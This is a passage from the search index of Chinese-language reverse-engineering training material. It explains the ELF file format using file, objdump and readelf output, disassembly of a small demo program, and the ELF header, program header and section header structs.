GNU/Linux 3.2.0, BuildID[sha1]=50036015393a99344897cbf34099256c3793e172, not stripped\n\n$ file elfDemo_static.out\nelfDemo_static.out: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=276c839c20b4c187e4b486cf96d82a90c40f4dae, not stripped\n\n$ file -L /usr/lib32/libc.so.6\n/usr/lib32/libc.so.6: ELF 32-bit LSB shared object, Intel 80386, version 1 (GNU/Linux), dynamically linked, interpreter /usr/lib32/ld-linux.so.2, BuildID[sha1]=ee88d1b2aa81f104ab5645d407e190b244203a52, for GNU/Linux 3.2.0, not stripped\n</code></pre> <p>\u4e8e\u662f\u6211\u4eec\u5f97\u5230\u4e86 Linux \u53ef\u6267\u884c\u6587\u4ef6\u683c\u5f0f ELF \uff08Executable Linkable Format\uff09\u6587\u4ef6\u7684\u4e09\u79cd\u7c7b\u578b\uff1a</p> <ul> <li>\u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6\uff08Relocatable file\uff09</li> <li>\u5305\u542b\u4e86\u4ee3\u7801\u548c\u6570\u636e\uff0c\u53ef\u4ee5\u548c\u5176\u4ed6\u76ee\u6807\u6587\u4ef6\u94fe\u63a5\u751f\u6210\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u6216\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u3002</li> <li>elfDemo.o</li> <li>\u53ef\u6267\u884c\u6587\u4ef6\uff08Executable File\uff09</li> <li>\u5305\u542b\u4e86\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\u7684\u6587\u4ef6\u3002</li> <li>elfDemo_static.out</li> <li>\u5171\u4eab\u76ee\u6807\u6587\u4ef6\uff08Shared Object File\uff09</li> <li>\u5305\u542b\u4e86\u7528\u4e8e\u94fe\u63a5\u7684\u4ee3\u7801\u548c\u6570\u636e\uff0c\u5206\u4e24\u79cd\u60c5\u51b5\u3002\u4e00\u79cd\u662f\u94fe\u63a5\u5668\u5c06\u5176\u4e0e\u5176\u4ed6\u7684\u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6\u548c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u94fe\u63a5\u8d77\u6765\uff0c\u751f\u4ea7\u65b0\u7684\u76ee\u6807\u6587\u4ef6\u3002\u53e6\u4e00\u79cd\u662f\u52a8\u6001\u94fe\u63a5\u5668\u5c06\u591a\u4e2a\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e0e\u53ef\u6267\u884c\u6587\u4ef6\u7ed3\u5408\uff0c\u4f5c\u4e3a\u8fdb\u7a0b\u6620\u50cf\u7684\u4e00\u90e8\u5206\u3002</li> <li>elfDemo.out</li> <li><code>libc-2.25.so</code></li> </ul> <p>\u6b64\u65f6\u4ed6\u4eec\u7684\u7ed3\u6784\u5982\u56fe\uff1a</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u5728\u8fd9\u4e2a\u7b80\u5316\u7684 ELF \u6587\u4ef6\u4e2d\uff0c\u5f00\u5934\u662f\u4e00\u4e2a\u201c\u6587\u4ef6\u5934\u201d\uff0c\u4e4b\u540e\u5206\u522b\u662f\u4ee3\u7801\u6bb5\u3001\u6570\u636e\u6bb5\u548c.bss\u6bb5\u3002\u7a0b\u5e8f\u6e90\u4ee3\u7801\u7f16\u8bd1\u540e\uff0c\u6267\u884c\u8bed\u53e5\u53d8\u6210\u673a\u5668\u6307\u4ee4\uff0c\u4fdd\u5b58\u5728<code>.text</code>\u6bb5\uff1b\u5df2\u521d\u59cb\u5316\u7684\u5168\u5c40\u53d8\u91cf\u548c\u5c40\u90e8\u9759\u6001\u53d8\u91cf\u90fd\u4fdd\u5b58\u5728<code>.data</code>\u6bb5\uff1b\u672a\u521d\u59cb\u5316\u7684\u5168\u5c40\u53d8\u91cf\u548c\u5c40\u90e8\u9759\u6001\u53d8\u91cf\u5219\u653e\u5728<code>.bss</code>\u6bb5\u3002</p> <p>\u628a\u7a0b\u5e8f\u6307\u4ee4\u548c\u7a0b\u5e8f\u6570\u636e\u5206\u5f00\u5b58\u653e\u6709\u8bb8\u591a\u597d\u5904\uff0c\u4ece\u5b89\u5168\u7684\u89d2\u5ea6\u8bb2\uff0c\u5f53\u7a0b\u5e8f\u88ab\u52a0\u8f7d\u540e\uff0c\u6570\u636e\u548c\u6307\u4ee4\u5206\u522b\u88ab\u6620\u5c04\u5230\u4e24\u4e2a\u865a\u62df\u533a\u57df\u3002\u7531\u4e8e\u6570\u636e\u533a\u57df\u5bf9\u4e8e\u8fdb\u7a0b\u6765\u8bf4\u662f\u53ef\u8bfb\u5199\u7684\uff0c\u800c\u6307\u4ee4\u533a\u57df\u5bf9\u4e8e\u8fdb\u7a0b\u6765\u8bf4\u662f\u53ea\u8bfb\u7684\uff0c\u6240\u4ee5\u8fd9\u4e24\u4e2a\u865a\u5b58\u533a\u57df\u7684\u6743\u9650\u53ef\u4ee5\u88ab\u5206\u522b\u8bbe\u7f6e\u6210\u53ef\u8bfb\u5199\u548c\u53ea\u8bfb\uff0c\u53ef\u4ee5\u9632\u6b62\u7a0b\u5e8f\u7684\u6307\u4ee4\u88ab\u6539\u5199\u548c\u5229\u7528\u3002</p>"},{"location":"Training/Material/Reverse/#elfdemoo","title":"elfDemo.o","text":"<p>\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u66f4\u6df1\u5165\u5730\u63a2\u7d22\u76ee\u6807\u6587\u4ef6\uff0c\u4f7f\u7528 objdump \u6765\u67e5\u770b\u76ee\u6807\u6587\u4ef6\u7684\u5185\u90e8\u7ed3\u6784:</p> <pre><code>$ objdump -h elfDemo.o\n\nelfDemo.o:     file format elf32-i386\n\nSections:\nIdx Name          Size      VMA       LMA       File off  Algn\n  0 .group        00000008  00000000  00000000  00000034  2**2\n                  CONTENTS, READONLY, GROUP, LINK_ONCE_DISCARD\n  1 .text         00000078  00000000  00000000  0000003c  2**0\n                  CONTENTS, ALLOC, LOAD, RELOC, READONLY, CODE\n  2 .data         00000008  00000000  00000000  000000b4  2**2\n                  CONTENTS, ALLOC, LOAD, DATA\n  3 .bss          00000004  00000000  00000000  000000bc  2**2\n                  ALLOC\n  4 .rodata       00000004  00000000  00000000  000000bc  2**0\n                  CONTENTS, ALLOC, LOAD, READONLY, DATA\n  5 .text.__x86.get_pc_thunk.ax 00000004  00000000  00000000  000000c0  2**0\n                  CONTENTS, ALLOC, LOAD, READONLY, CODE\n  6 .comment      00000012  00000000  00000000  000000c4  2**0\n                  CONTENTS, READONLY\n  7 .note.GNU-stack 00000000  00000000  00000000  000000d6  2**0\n                  CONTENTS, READONLY\n  8 .eh_frame     0000007c  00000000  00000000  000000d8  2**2\n                  CONTENTS, ALLOC, LOAD, RELOC, READONLY, DATA\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\u76ee\u6807\u6587\u4ef6\u4e2d\u9664\u4e86\u6700\u57fa\u672c\u7684\u4ee3\u7801\u6bb5\u3001\u6570\u636e\u6bb5\u548c BSS \u6bb5\u4ee5\u5916\uff0c\u8fd8\u6709\u4e00\u4e9b\u522b\u7684\u6bb5\u3002\u6ce8\u610f\u5230 .bss \u6bb5\u6ca1\u6709 <code>CONTENTS</code> \u5c5e\u6027\uff0c\u8868\u793a\u5b83\u5b9e\u9645\u4e0a\u5e76\u4e0d\u5b58\u5728\uff0c.bss \u6bb5\u53ea\u662f\u4e3a\u4e3a\u672a\u521d\u59cb\u5316\u7684\u5168\u5c40\u53d8\u91cf\u548c\u5c40\u90e8\u9759\u6001\u53d8\u91cf\u9884\u7559\u4e86\u4f4d\u7f6e\u800c\u5df2\u3002</p>"},{"location":"Training/Material/Reverse/#_26","title":"\u4ee3\u7801\u6bb5","text":"<pre><code>$ objdump -x -s -d elfDemo.o\n......\nSections:\nIdx Name          Size      VMA       LMA       File off  Algn\n\n......\n\n  1 .text         00000078  00000000  00000000  0000003c  2**0\n                  CONTENTS, ALLOC, LOAD, RELOC, READONLY, CODE\n......\nContents of section .text:\n 0000 5589e553 83ec04e8 fcffffff 05010000  U..S............\n 0010 0083ec08 ff75088d 90000000 005289c3  .....u.......R..\n 0020 e8fcffff ff83c410 908b5dfc c9c38d4c  ..........]....L\n 0030 240483e4 f0ff71fc 5589e551 83ec14e8  $.....q.U..Q....\n 0040 fcffffff 05010000 00c745f4 1e000000  ..........E.....\n 0050 8b880000 00008b55 f401ca8b 80040000  .......U........\n 0060 0001d083 ec0c50e8 fcffffff 83c41090  ......P.........\n 0070 8b4dfcc9 8d61fcc3                    .M...a..\n......\nDisassembly of section .text:\n\n00000000 &lt;func&gt;:\n   0:   55                      push   %ebp\n   1:   89 e5                   mov    %esp,%ebp\n   3:   53                      push   %ebx\n   4:   83 ec 04                sub    $0x4,%esp\n   7:   e8 fc ff ff ff          call   8 &lt;func+0x8&gt;\n                        8: R_386_PC32   __x86.get_pc_thunk.ax\n   c:   05 01 00 00 00          add    $0x1,%eax\n                        d: R_386_GOTPC  _GLOBAL_OFFSET_TABLE_\n  11:   83 ec 08                sub    $0x8,%esp\n  14:   ff 75 08                pushl  0x8(%ebp)\n  17:   8d 90 00 00 00 00       lea    0x0(%eax),%edx\n                        19: R_386_GOTOFF        .rodata\n  1d:   52                      push   %edx\n  1e:   89 c3                   mov    %eax,%ebx\n  20:   e8 fc ff ff ff          call   21 &lt;func+0x21&gt;\n                        21: R_386_PLT32 printf\n  25:   83 c4 10                add    $0x10,%esp\n  28:   90                      nop\n  29:   8b 5d fc                mov    -0x4(%ebp),%ebx\n  2c:   c9                      leave  \n  2d:   c3                      ret\n\n0000002e &lt;main&gt;:\n  2e:   8d 4c 24 04             lea    0x4(%esp),%ecx\n  32:   83 e4 f0                and    $0xfffffff0,%esp\n  35:   ff 71 fc                pushl  -0x4(%ecx)\n  38:   55                      push   %ebp\n  39:   89 e5                   mov    %esp,%ebp\n  3b:   51                      push   %ecx\n  3c:   83 ec 14                sub    $0x14,%esp\n  3f:   e8 fc ff ff ff          call   40 &lt;main+0x12&gt;\n                        40: R_386_PC32  __x86.get_pc_thunk.ax\n  44:   05 01 00 00 00          add    $0x1,%eax\n                        45: R_386_GOTPC _GLOBAL_OFFSET_TABLE_\n  49:   c7 45 f4 1e 00 00 00    movl   $0x1e,-0xc(%ebp)\n  50:   8b 88 00 00 00 00       mov    0x0(%eax),%ecx\n                        52: R_386_GOTOFF        global_init_var\n  56:   8b 55 f4                mov    -0xc(%ebp),%edx\n  59:   01 ca                   add    %ecx,%edx\n  5b:   8b 80 04 00 00 00       mov    0x4(%eax),%eax\n                        5d: R_386_GOTOFF        .data\n  61:   01 d0                   add    %edx,%eax\n  63:   83 ec 0c                sub    $0xc,%esp\n  66:   50                      push   %eax\n  67:   e8 fc ff ff ff          call   68 &lt;main+0x3a&gt;\n                        68: R_386_PC32  func\n  6c:   83 c4 10                add    $0x10,%esp\n  6f:   90                      nop\n  70:   8b 4d fc                mov    -0x4(%ebp),%ecx\n  73:   c9                      leave  \n  74:   8d 61 fc                lea    -0x4(%ecx),%esp\n  77:   c3                      ret\n</code></pre> <p><code>Contents of section .text</code> \u662f <code>.text</code> \u7684\u6570\u636e\u7684\u5341\u516d\u8fdb\u5236\u5f62\u5f0f\uff0c\u603b\u5171 0x78 \u4e2a\u5b57\u8282\uff0c\u6700\u5de6\u8fb9\u4e00\u5217\u662f\u504f\u79fb\u91cf\uff0c\u4e2d\u95f4 4 \u5217\u662f\u5185\u5bb9\uff0c\u6700\u53f3\u8fb9\u4e00\u5217\u662f ASCII \u7801\u5f62\u5f0f\u3002\u4e0b\u9762\u7684 <code>Disassembly of section .text</code> \u662f\u53cd\u6c47\u7f16\u7ed3\u679c\u3002</p>"},{"location":"Training/Material/Reverse/#_27","title":"\u6570\u636e\u6bb5\u548c\u53ea\u8bfb\u6570\u636e\u6bb5","text":"<pre><code>......\nSections:\nIdx Name          Size      VMA       LMA       File off  Algn\n  2 .data         00000008  00000000  00000000  000000b4  2**2\n                  CONTENTS, ALLOC, LOAD, DATA\n  4 .rodata       00000004  00000000  00000000  000000bc  2**0\n                  CONTENTS, ALLOC, LOAD, READONLY, DATA\n......\nContents of section .data:\n 0000 0a000000 14000000                    ........\nContents of section .rodata:\n 0000 25640a00                             %d..\n.......\n</code></pre> <p><code>.data</code> \u6bb5\u4fdd\u5b58\u5df2\u7ecf\u521d\u59cb\u5316\u4e86\u7684\u5168\u5c40\u53d8\u91cf\u548c\u5c40\u90e8\u9759\u6001\u53d8\u91cf\u3002<code>elfDemo.c</code> \u4e2d\u5171\u6709\u4e24\u4e2a\u8fd9\u6837\u7684\u53d8\u91cf\uff0c<code>global_init_var</code> \u548c <code>local_static_init_var</code>\uff0c\u6bcf\u4e2a\u53d8\u91cf 4 \u4e2a\u5b57\u8282\uff0c\u4e00\u5171 8 \u4e2a\u5b57\u8282\u3002\u7531\u4e8e\u5c0f\u7aef\u5e8f\u7684\u539f\u56e0\uff0c<code>0a000000</code> \u8868\u793a <code>global_init_var</code> \u503c\uff08<code>10</code>\uff09\u7684\u5341\u516d\u8fdb\u5236 <code>0x0a</code>\uff0c<code>14000000</code> \u8868\u793a <code>local_static_init_var</code> \u503c\uff08<code>20</code>\uff09\u7684\u5341\u516d\u8fdb\u5236 <code>0x14</code>\u3002</p> <p><code>.rodata</code> \u6bb5\u4fdd\u5b58\u53ea\u8bfb\u6570\u636e\uff0c\u5305\u62ec\u53ea\u8bfb\u53d8\u91cf\u548c\u5b57\u7b26\u4e32\u5e38\u91cf\u3002<code>elfDemo.c</code> \u4e2d\u8c03\u7528 <code>printf</code> \u7684\u65f6\u5019\uff0c\u7528\u5230\u4e86\u4e00\u4e2a\u5b57\u7b26\u4e32\u53d8\u91cf <code>%d\\n</code>\uff0c\u5b83\u662f\u4e00\u79cd\u53ea\u8bfb\u6570\u636e\uff0c\u4fdd\u5b58\u5728 <code>.rodata</code> \u6bb5\u4e2d\uff0c\u53ef\u4ee5\u4ece\u8f93\u51fa\u7ed3\u679c\u770b\u5230\u5b57\u7b26\u4e32\u5e38\u91cf\u7684 ASCII \u5f62\u5f0f\uff0c\u4ee5 <code>\\0</code> \u7ed3\u5c3e\u3002</p>"},{"location":"Training/Material/Reverse/#bss","title":"BSS\u6bb5","text":"<pre><code>Sections:\nIdx Name          Size      VMA       LMA       File off  Algn\n  3 .bss          00000004  00000000  00000000  000000bc  2**2\n                  ALLOC\n</code></pre> <p><code>.bss</code> \u6bb5\u4fdd\u5b58\u672a\u521d\u59cb\u5316\u7684\u5168\u5c40\u53d8\u91cf\u548c\u5c40\u90e8\u9759\u6001\u53d8\u91cf\u3002</p>"},{"location":"Training/Material/Reverse/#elf","title":"ELF \u6587\u4ef6\u7ed3\u6784","text":"<p>\u5bf9\u8c61\u6587\u4ef6\u53c2\u4e0e\u7a0b\u5e8f\u94fe\u63a5\uff08\u6784\u5efa\u7a0b\u5e8f\uff09\u548c\u7a0b\u5e8f\u6267\u884c\uff08\u8fd0\u884c\u7a0b\u5e8f\uff09\u3002ELF \u7ed3\u6784\u51e0\u76f8\u5173\u4fe1\u606f\u5728 <code>/usr/include/elf.h</code>\u3000\u6587\u4ef6\u4e2d\u3002</p> <p></p> <ul> <li>ELF \u6587\u4ef6\u5934\uff08ELF Header\uff09 \u5728\u76ee\u6807\u6587\u4ef6\u683c\u5f0f\u7684\u6700\u524d\u9762\uff0c\u5305\u542b\u4e86\u63cf\u8ff0\u6574\u4e2a\u6587\u4ef6\u7684\u57fa\u672c\u5c5e\u6027\u3002</li> <li>\u7a0b\u5e8f\u5934\u8868\uff08Program Header Table\uff09 \u662f\u53ef\u9009\u7684\uff0c\u5b83\u544a\u8bc9\u7cfb\u7edf\u600e\u6837\u521b\u5efa\u4e00\u4e2a\u8fdb\u7a0b\u6620\u50cf\u3002\u53ef\u6267\u884c\u6587\u4ef6\u5fc5\u987b\u6709\u7a0b\u5e8f\u5934\u8868\uff0c\u800c\u91cd\u5b9a\u4f4d\u6587\u4ef6\u4e0d\u9700\u8981\u3002</li> <li>\u6bb5\uff08Section\uff09 \u5305\u542b\u4e86\u94fe\u63a5\u89c6\u56fe\u4e2d\u5927\u91cf\u7684\u76ee\u6807\u6587\u4ef6\u4fe1\u606f\u3002</li> <li>\u6bb5\u8868\uff08Section Header Table\uff09 \u5305\u542b\u4e86\u63cf\u8ff0\u6587\u4ef6\u4e2d\u6240\u6709\u6bb5\u7684\u4fe1\u606f\u3002</li> </ul>"},{"location":"Training/Material/Reverse/#32","title":"32\u4f4d\u6570\u636e\u7c7b\u578b","text":"\u540d\u79f0 \u957f\u5ea6 \u5bf9\u5176 \u63cf\u8ff0 \u539f\u59cb\u7c7b\u578b Elf32_Addr 4 4 \u65e0\u7b26\u53f7\u7a0b\u5e8f\u5730\u5740 uint32_t Elf32_Half 2 2 \u65e0\u7b26\u53f7\u77ed\u6574\u578b uint16_t Elf32_Off 4 4 \u65e0\u7b26\u53f7\u504f\u79fb\u5730\u5740 uint32_t Elf32_Sword 4 4 \u6709\u7b26\u53f7\u6574\u578b int32_t Elf32_Word 4 4 \u65e0\u7b26\u53f7\u6574\u578b uint32_t"},{"location":"Training/Material/Reverse/#_28","title":"\u6587\u4ef6\u5934","text":"<p>ELF \u6587\u4ef6\u5934\u5fc5\u7136\u5b58\u5728\u4e8e ELF \u6587\u4ef6\u7684\u5f00\u5934\uff0c\u8868\u660e\u8fd9\u662f\u4e00\u4e2a ELF \u6587\u4ef6\u3002\u5b9a\u4e49\u5982\u4e0b\uff1a</p> <pre><code>typedef struct\n{\n  unsigned char e_ident[EI_NIDENT]; /* Magic number and other info */\n  Elf32_Half    e_type;         /* Object file type */\n  Elf32_Half    e_machine;      /* Architecture */\n  Elf32_Word    e_version;      /* Object file version */\n  Elf32_Addr    e_entry;        /* Entry point virtual address */\n  Elf32_Off e_phoff;        /* Program header table file offset */\n  Elf32_Off e_shoff;        /* Section header table file offset */\n  Elf32_Word    e_flags;        /* Processor-specific flags */\n  Elf32_Half    e_ehsize;       /* ELF header size in bytes */\n  Elf32_Half    e_phentsize;        /* Program header table entry size */\n  Elf32_Half    e_phnum;        /* Program header table entry count */\n  Elf32_Half    e_shentsize;        /* Section header table entry size */\n  Elf32_Half    e_shnum;        /* Section header table entry count */\n  Elf32_Half    e_shstrndx;     /* Section header string table index */\n} Elf32_Ehdr;\n\ntypedef struct\n{\n  unsigned char e_ident[EI_NIDENT]; /* Magic number and other info */\n  Elf64_Half    e_type;         /* Object file type */\n  Elf64_Half    e_machine;      /* Architecture */\n  Elf64_Word    e_version;      /* Object file version */\n  Elf64_Addr    e_entry;        /* Entry point virtual address */\n  Elf64_Off e_phoff;        /* Program header table file offset */\n  Elf64_Off e_shoff;        /* Section header table file offset */\n  Elf64_Word    e_flags;        /* Processor-specific flags */\n  Elf64_Half    e_ehsize;       /* ELF header size in bytes */\n  Elf64_Half    e_phentsize;        /* Program header table entry size */\n  Elf64_Half    e_phnum;        /* Program header table entry count */\n  Elf64_Half    e_shentsize;        /* Section header table entry size */\n  Elf64_Half    e_shnum;        /* Section header table entry count */\n  Elf64_Half    e_shstrndx;     /* Section header string table index */\n} Elf64_Ehdr;\n</code></pre> <p><code>e_ident</code> \u4fdd\u5b58\u7740 ELF \u7684\u5e7b\u6570\u548c\u5176\u4ed6\u4fe1\u606f\uff0c\u6700\u524d\u9762\u56db\u4e2a\u5b57\u8282\u662f\u5e7b\u6570\uff0c\u7528\u5b57\u7b26\u4e32\u8868\u793a\u4e3a <code>\\177ELF</code>\uff0c\u5176\u540e\u7684\u5b57\u8282\u5982\u679c\u662f 32 \u4f4d\u5219\u662f ELFCLASS32 (1)\uff0c\u5982\u679c\u662f 64 \u4f4d\u5219\u662f ELFCLASS64 (2)\uff0c\u518d\u5176\u540e\u7684\u5b57\u8282\u8868\u793a\u7aef\u5e8f\uff0c\u5c0f\u7aef\u5e8f\u4e3a ELFDATA2LSB (1)\uff0c\u5927\u7aef\u5e8f\u4e3a ELFDATA2LSB (2)\u3002\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u5219\u8868\u793a ELF \u7684\u7248\u672c\u3002</p> <p>\u73b0\u5728\u6211\u4eec\u4f7f\u7528 readelf \u547d\u4ee4\u6765\u67e5\u770b elfDome.out \u7684\u6587\u4ef6\u5934\uff1a</p> <pre><code>$ readelf -h elfDemo.out\nELF Header:\n  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00\n  Class:                             ELF32\n  Data:                              2's complement, little endian\n  Version:                           1 (current)\n  OS/ABI:                            UNIX - System V\n  ABI Version:                       0\n  Type:                              DYN (Shared object file)\n  Machine:                           Intel 80386\n  Version:                           0x1\n  Entry point address:               0x3e0\n  Start of program headers:          52 (bytes into file)\n  Start of section headers:          6288 (bytes into file)\n  Flags:                             0x0\n  Size of this header:               52 (bytes)\n  Size of program headers:           32 (bytes)\n  Number of program headers:         9\n  Size of section headers:           40 (bytes)\n  Number of section headers:         30\n  Section header string table index: 29\n</code></pre>"},{"location":"Training/Material/Reverse/#_29","title":"\u7a0b\u5e8f\u5934","text":"<p>\u7a0b\u5e8f\u5934\u8868\u662f\u7531 ELF \u5934\u7684 <code>e_phoff</code> \u6307\u5b9a\u7684\u504f\u79fb\u91cf\u548c <code>e_phentsize</code>\u3001<code>e_phnum</code> \u5171\u540c\u786e\u5b9a\u5927\u5c0f\u7684\u8868\u683c\u7ec4\u6210\u3002<code>e_phentsize</code> \u8868\u793a\u8868\u683c\u4e2d\u7a0b\u5e8f\u5934\u7684\u5927\u5c0f\uff0c<code>e_phnum</code> \u8868\u793a\u8868\u683c\u4e2d\u7a0b\u5e8f\u5934\u7684\u6570\u91cf\u3002</p> <p>\u7a0b\u5e8f\u5934\u7684\u5b9a\u4e49\u5982\u4e0b\uff1a</p> <pre><code>typedef struct\n{\n  Elf32_Word    p_type;         /* Segment type */\n  Elf32_Off p_offset;       /* Segment file offset */\n  Elf32_Addr    p_vaddr;        /* Segment virtual address */\n  Elf32_Addr    p_paddr;        /* Segment physical address */\n  Elf32_Word    p_filesz;       /* Segment size in file */\n  Elf32_Word    p_memsz;        /* Segment size in memory */\n  Elf32_Word    p_flags;        /* Segment flags */\n  Elf32_Word    p_align;        /* Segment alignment */\n} Elf32_Phdr;\n\ntypedef struct\n{\n  Elf64_Word    p_type;         /* Segment type */\n  Elf64_Word    p_flags;        /* Segment flags */\n  Elf64_Off p_offset;       /* Segment file offset */\n  Elf64_Addr    p_vaddr;        /* Segment virtual address */\n  Elf64_Addr    p_paddr;        /* Segment physical address */\n  Elf64_Xword   p_filesz;       /* Segment size in file */\n  Elf64_Xword   p_memsz;        /* Segment size in memory */\n  Elf64_Xword   p_align;        /* Segment alignment */\n} Elf64_Phdr;\n</code></pre> <p>\u4f7f\u7528 readelf \u6765\u67e5\u770b\u7a0b\u5e8f\u5934\uff1a</p> <pre><code>$ readelf -l elfDemo.out\n\nElf file type is DYN (Shared object file)\nEntry point 0x3e0\nThere are 9 program headers, starting at offset 52\n\nProgram Headers:\n  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align\n  PHDR           0x000034 0x00000034 0x00000034 0x00120 0x00120 R E 0x4\n  INTERP         0x000154 0x00000154 0x00000154 0x00013 0x00013 R   0x1\n      [Requesting program interpreter: /lib/ld-linux.so.2]\n  LOAD           0x000000 0x00000000 0x00000000 0x00780 0x00780 R E 0x1000\n  LOAD           0x000ef4 0x00001ef4 0x00001ef4 0x00130 0x0013c RW  0x1000\n  DYNAMIC        0x000efc 0x00001efc 0x00001efc 0x000f0 0x000f0 RW  0x4\n  NOTE           0x000168 0x00000168 0x00000168 0x00044 0x00044 R   0x4\n  GNU_EH_FRAME   0x000624 0x00000624 0x00000624 0x00044 0x00044 R   0x4\n  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10\n  GNU_RELRO      0x000ef4 0x00001ef4 0x00001ef4 0x0010c 0x0010c R   0x1\n\n Section to Segment mapping:\n  Segment Sections...\n   00\n   01     .interp\n   02     .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt .init .plt .plt.got .text .fini .rodata .eh_frame_hdr .eh_frame\n   03     .init_array .fini_array .dynamic .got .got.plt .data .bss\n   04     .dynamic\n   05     .note.ABI-tag .note.gnu.build-id\n   06     .eh_frame_hdr\n   07\n   08     .init_array .fini_array .dynamic .got\n</code></pre>"},{"location":"Training/Material/Reverse/#_30","title":"\u6bb5","text":"<p>\u6bb5\u8868\uff08Section Header Table\uff09\u662f\u4e00\u4e2a\u4ee5 <code>Elf32_Shdr</code>\u3000\u7ed3\u6784\u4f53\u4e3a\u5143\u7d20\u7684\u6570\u7ec4\uff0c\u6bcf\u4e2a\u7ed3\u6784\u4f53\u5bf9\u5e94\u4e00\u4e2a\u6bb5\uff0c\u5b83\u63cf\u8ff0\u4e86\u5404\u4e2a\u6bb5\u7684\u4fe1\u606f\u3002ELF \u6587\u4ef6\u5934\u7684 <code>e_shoff</code>\u3000\u6210\u5458\u7ed9\u51fa\u4e86\u6bb5\u8868\u5728 ELF \u4e2d\u7684\u504f\u79fb\uff0c<code>e_shnum</code> \u6210\u5458\u7ed9\u51fa\u4e86\u6bb5\u63cf\u8ff0\u7b26\u7684\u6570\u91cf\uff0c<code>e_shentsize</code> \u7ed9\u51fa\u4e86\u6bcf\u4e2a\u6bb5\u63cf\u8ff0\u7b26\u7684\u5927\u5c0f\u3002</p> <pre><code>typedef struct\n{\n  Elf32_Word    sh_name;        /* Section name (string tbl index) */\n  Elf32_Word    sh_type;        /* Section type */\n  Elf32_Word    sh_flags;       /* Section flags */\n  Elf32_Addr    sh_addr;        /* Section virtual addr at execution */\n  Elf32_Off sh_offset;      /* Section file offset */\n  Elf32_Word    sh_size;        /* Section size in bytes */\n  Elf32_Word    sh_link;        /* Link to another section */\n  Elf32_Word    sh_info;        /* Additional section information */\n  Elf32_Word    sh_addralign;       /* Section alignment */\n  Elf32_Word    sh_entsize;     /* Entry size if section holds table */\n} Elf32_Shdr;\n\ntypedef struct\n{\n  Elf64_Word    sh_name;        /* Section name (string tbl index) */\n  Elf64_Word    sh_type;        /* Section type */\n  Elf64_Xword   sh_flags;       /* Section flags */\n  Elf64_Addr    sh_addr;        /* Section virtual addr at execution */\n  Elf64_Off sh_offset;      /* Section file offset */\n  Elf64_Xword   sh_size;        /* Section size in bytes */\n  Elf64_Word    sh_link;        /* Link to another section */\n  Elf64_Word    sh_info;        /* Additional section information */\n  Elf64_Xword   sh_addralign;       /* Section alignment */\n  Elf64_Xword   sh_entsize;     /* Entry size if section holds table */\n} Elf64_Shdr;\n</code></pre> <p>\u4f7f\u7528 readelf \u547d\u4ee4\u67e5\u770b\u76ee\u6807\u6587\u4ef6\u4e2d\u5b8c\u6574\u7684\u6bb5\uff1a</p> <pre><code>$ readelf -S elfDemo.o\nThere are 15 section headers, starting at offset 0x41c:\n\nSection Headers:\n  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al\n  [ 0]                   NULL            00000000 000000 000000 00      0   0  0\n  [ 1] .group            GROUP           00000000 000034 000008 04     12  16  4\n  [ 2] .text             PROGBITS        00000000 00003c 000078 00  AX  0   0  1\n  [ 3] .rel.text         REL             00000000 000338 000048 08   I 12   2  4\n  [ 4] .data             PROGBITS        00000000 0000b4 000008 00  WA  0   0  4\n  [ 5] .bss              NOBITS          00000000 0000bc 000004 00  WA  0   0  4\n  [ 6] .rodata           PROGBITS        00000000 0000bc 000004 00   A  0   0  1\n  [ 7] .text.__x86.get_p PROGBITS        00000000 0000c0 000004 00 AXG  0   0  1\n  [ 8] .comment          PROGBITS        00000000 0000c4 000012 01  MS  0   0  1\n  [ 9] .note.GNU-stack   PROGBITS        00000000 0000d6 000000 00      0   0  1\n  [10] .eh_frame         PROGBITS        00000000 0000d8 00007c 00   A  0   0  4\n  [11] .rel.eh_frame     REL             00000000 000380 000018 08   I 12  10  4\n  [12] .symtab           SYMTAB          00000000 000154 000140 10     13  13  4\n  [13] .strtab           STRTAB          00000000 000294 0000a2 00      0   0  1\n  [14] .shstrtab         STRTAB          00000000 000398 000082 00      0   0  1\nKey to Flags:\n  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),\n  L (link order), O (extra OS processing required), G (group), T (TLS),\n  C (compressed), x (unknown), o (OS specific), E (exclude),\n  p (processor specific)\n</code></pre> <p>\u6ce8\u610f\uff0cELF \u6bb5\u8868\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\u662f\u88ab\u4fdd\u7559\u7684\uff0c\u7c7b\u578b\u4e3a NULL\u3002</p>"},{"location":"Training/Material/Reverse/#_31","title":"\u5b57\u7b26\u4e32\u8868","text":"<p>\u5b57\u7b26\u4e32\u8868\u4ee5\u6bb5\u7684\u5f62\u5f0f\u5b58\u5728\uff0c\u5305\u542b\u4e86\u4ee5 